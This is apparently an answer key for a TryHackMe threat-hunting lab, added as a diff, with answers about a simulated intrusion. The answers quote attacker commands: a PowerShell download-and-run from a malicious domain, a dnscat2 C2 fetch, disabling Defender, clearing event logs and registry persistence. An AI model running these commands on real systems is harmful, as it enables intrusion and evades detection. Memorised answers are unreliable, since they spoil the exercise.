@@ -1,0 +1,44 @@
+Threat Hunting: Foothold
+https://tryhackme.com/room/threathuntingfoothold
+
+What is the attacker's successful authentication timestamp on the Jumphost server?
+Jul 3, 2023 @ 14:14:09.000
+
+What is the name of the PHP file accessed by the attacker via the cat command after gaining successful code execution on web01?
+config.php
+
+What is the name of the unusual process executed within the timeframe of update.lnk execution on WKSTN-2?
+powershell.exe
+
+Tracing back the cmd and PowerShell child processes spawned by installer.exe, what is the first command executed via cmd?
+whoami /priv
+
+Using the process ID of the PowerShell process spawned by mshta.exe, what is the destination IP of the network connections made by this process?
+167.71.198.43
+
+Following the cmd.exe process spawned by Python, what is the command-line value of the net.exe process?
+net users
+
+What is the PID of the cmd.exe process that executed "powershell Set-MpPreference -DisableRealtimeMonitoring $true"?
+428
+
+What is the PowerShell command-line argument used to clear the event logs of WKSTN-1?
+Clear-EventLog -LogName Security
+
+What is the process PID of chrome.exe's target for process injection?
+4240
+
+What is the name of the parent process of the cmd.exe process that executed the scheduled task creation?
+powershell.exe
+
+Using the process ID of malicious reg.exe execution, what is the value of the process command line used to execute the registry modification?
+cmd /c "REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d \"C:\Windows\Temp\installer.exe\""
+
+What is the link downloaded using PowerShell to establish the C2 over DNS?
+https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1
+
+After investigating C2 over Discord events, what command is used to download the malicious dev.py python script?
+powershell iwr http://www.oneedirve.xyz/321c3cf/dev.py -outfile C:\Windows\Tasks\dev.py; python3 C:\Windows\Tasks\dev.py
+
+What is the name of the process that is also associated with cdn[.]golge[.]xyz?
+update.exe
